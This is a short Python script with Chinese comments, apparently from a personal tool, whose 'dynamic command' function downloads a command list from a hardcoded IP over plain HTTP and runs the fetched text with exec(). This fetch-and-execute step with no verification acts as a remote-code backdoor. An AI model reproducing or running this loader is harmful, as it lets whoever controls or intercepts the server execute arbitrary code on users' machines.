#动态命令对照文件服务器位置
dtml_dz_ml = "http://60.205.221.103/zzz/v2ray/dtml.json"
#动态命令对照文件本地位置
dtml_dz_ml_bd = "C:/pythonz5/unsers/dtml.json"
#动态命令正文本地位置
dtml_dz_ml_bd_zw = "C:/pythonz5/unsers/dtmlzw.txt"

def gg(z):
	#用于分解输出公告的函数
	gg_lb = z.split('*')
	for x in gg_lb:
		print(x)


def get_dtml_dzb():
	#用于获取特殊命令对照目录的函数
	request.urlretrieve(dtml_dz_ml, dtml_dz_ml_bd)


def get_dtml_xsdz(wz):
	#用于获取特殊命令对照目录的函数
	request.urlretrieve(wz, dtml_dz_ml_bd_zw)

def dq_dtml_ml(x):
	#用于读取动态命令目录的函数
	with open(dtml_dz_ml_bd, encoding='gbk') as zx:
		dtml_ml = json.load(zx)
	ml_dz = dtml_ml[x]
	return ml_dz

def dtml_srjc(Xx):
	#用于判断并执行特殊命令的函数
	e = ""
	mllb = []
	zcml = []
	if Xx == "0":
		print("")
	else:
		#获取命令对照表
		get_dtml_dzb()
		wz = dq_dtml_ml(Xx)
		#下载命令正文
		get_dtml_xsdz(wz)
		#读取并运行命令
		with open(dtml_dz_ml_bd_zw,encoding='UTF-8') as xxx:
			for hii in xxx:
				if hii == "~\n":
					e = "".join(zcml)
					mllb.append(e)
					zcml = []
				else:
					zcml.append(hii)
		for ml in mllb:
			exec(ml)
